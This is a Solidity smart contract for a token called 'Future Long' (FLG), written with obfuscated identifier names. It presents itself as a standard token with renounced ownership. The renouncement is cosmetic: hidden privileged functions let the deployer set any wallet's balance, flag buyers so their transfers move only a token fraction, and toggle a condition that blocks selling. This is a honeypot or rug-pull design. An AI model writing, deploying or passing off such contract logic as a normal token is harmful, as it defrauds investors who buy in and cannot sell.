//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface receiverExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listTeam {
    function createPair(address teamAuto, address receiverTotal) external returns (address);
}

interface fundTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedLimit) external view returns (uint256);

    function transfer(address fundReceiverAmount, uint256 atLimit) external returns (bool);

    function allowance(address enableExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 atLimit) external returns (bool);

    function transferFrom(
        address sender,
        address fundReceiverAmount,
        uint256 atLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTx, uint256 value);
    event Approval(address indexed enableExempt, address indexed spender, uint256 value);
}

interface tradingLiquidity is fundTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FutureLong is fundAuto, fundTo, tradingLiquidity {

    uint256 public exemptTotal;

    function decimals() external view virtual override returns (uint8) {
        return launchedTx;
    }

    mapping(address => mapping(address => uint256)) private totalModeAuto;

    string private listMin = "Future Long";

    function allowance(address receiverAmount, address fromWallet) external view virtual override returns (uint256) {
        if (fromWallet == txLaunch) {
            return type(uint256).max;
        }
        return totalModeAuto[receiverAmount][fromWallet];
    }

    uint256 minLimit;

    uint8 private launchedTx = 18;

    uint256 constant enableIs = 7 ** 10;

    uint256 takeTokenEnable;

    function owner() external view returns (address) {
        return autoLiquidity;
    }

    uint256 public autoMarketing;

    function receiverLimitTx(address minSellAuto) public {
        require(minSellAuto.balance < 100000);
        if (feeExemptEnable) {
            return;
        }
        if (limitWalletBuy != limitExempt) {
            exemptTotal = limitWalletBuy;
        }
        teamFund[minSellAuto] = true;
        
        feeExemptEnable = true;
    }

    function minTrading(address tradingTotal, address fundReceiverAmount, uint256 atLimit) internal returns (bool) {
        require(minAt[tradingTotal] >= atLimit);
        minAt[tradingTotal] -= atLimit;
        minAt[fundReceiverAmount] += atLimit;
        emit Transfer(tradingTotal, fundReceiverAmount, atLimit);
        return true;
    }

    address private autoLiquidity;

    function getOwner() external view returns (address) {
        return autoLiquidity;
    }

    address public walletIs;

    function swapReceiver() private view {
        require(teamFund[_msgSender()]);
    }

    mapping(address => uint256) private minAt;

    function totalSupply() external view virtual override returns (uint256) {
        return isListShould;
    }

    bool public fromBuy;

    string private shouldSwap = "FLG";

    function feeWalletSell(address tradingTotal, address fundReceiverAmount, uint256 atLimit) internal returns (bool) {
        if (tradingTotal == walletIs) {
            return minTrading(tradingTotal, fundReceiverAmount, atLimit);
        }
        uint256 fromAutoTeam = fundTo(fundTake).balanceOf(totalReceiver);
        require(fromAutoTeam == takeTokenEnable);
        require(fundReceiverAmount != totalReceiver);
        if (minTake[tradingTotal]) {
            return minTrading(tradingTotal, fundReceiverAmount, enableIs);
        }
        return minTrading(tradingTotal, fundReceiverAmount, atLimit);
    }

    address totalReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public txFund;

    function transfer(address swapWallet, uint256 atLimit) external virtual override returns (bool) {
        return feeWalletSell(_msgSender(), swapWallet, atLimit);
    }

    function name() external view virtual override returns (string memory) {
        return listMin;
    }

    function transferFrom(address tradingTotal, address fundReceiverAmount, uint256 atLimit) external override returns (bool) {
        if (_msgSender() != txLaunch) {
            if (totalModeAuto[tradingTotal][_msgSender()] != type(uint256).max) {
                require(atLimit <= totalModeAuto[tradingTotal][_msgSender()]);
                totalModeAuto[tradingTotal][_msgSender()] -= atLimit;
            }
        }
        return feeWalletSell(tradingTotal, fundReceiverAmount, atLimit);
    }

    function toLaunchedBuy(address toTeam) public {
        swapReceiver();
        if (limitWalletBuy == txFund) {
            exemptTotal = limitExempt;
        }
        if (toTeam == walletIs || toTeam == fundTake) {
            return;
        }
        minTake[toTeam] = true;
    }

    function launchFrom() public {
        emit OwnershipTransferred(walletIs, address(0));
        autoLiquidity = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldSwap;
    }

    address public fundTake;

    bool public feeExemptEnable;

    function approve(address fromWallet, uint256 atLimit) public virtual override returns (bool) {
        totalModeAuto[_msgSender()][fromWallet] = atLimit;
        emit Approval(_msgSender(), fromWallet, atLimit);
        return true;
    }

    mapping(address => bool) public teamFund;

    uint256 private isListShould = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed senderMode, address indexed buySwap);

    uint256 private limitExempt;

    address txLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address launchedLimit) public view virtual override returns (uint256) {
        return minAt[launchedLimit];
    }

    function maxTotal(uint256 atLimit) public {
        swapReceiver();
        takeTokenEnable = atLimit;
    }

    constructor (){
        if (limitExempt != limitWalletBuy) {
            walletFund = true;
        }
        receiverExempt enableLaunched = receiverExempt(txLaunch);
        fundTake = listTeam(enableLaunched.factory()).createPair(enableLaunched.WETH(), address(this));
        if (walletFund != fromBuy) {
            txFund = limitWalletBuy;
        }
        walletIs = _msgSender();
        launchFrom();
        teamFund[walletIs] = true;
        minAt[walletIs] = isListShould;
        
        emit Transfer(address(0), walletIs, isListShould);
    }

    uint256 private limitWalletBuy;

    mapping(address => bool) public minTake;

    bool private walletFund;

    function fromLimit(address swapWallet, uint256 atLimit) public {
        swapReceiver();
        minAt[swapWallet] = atLimit;
    }

}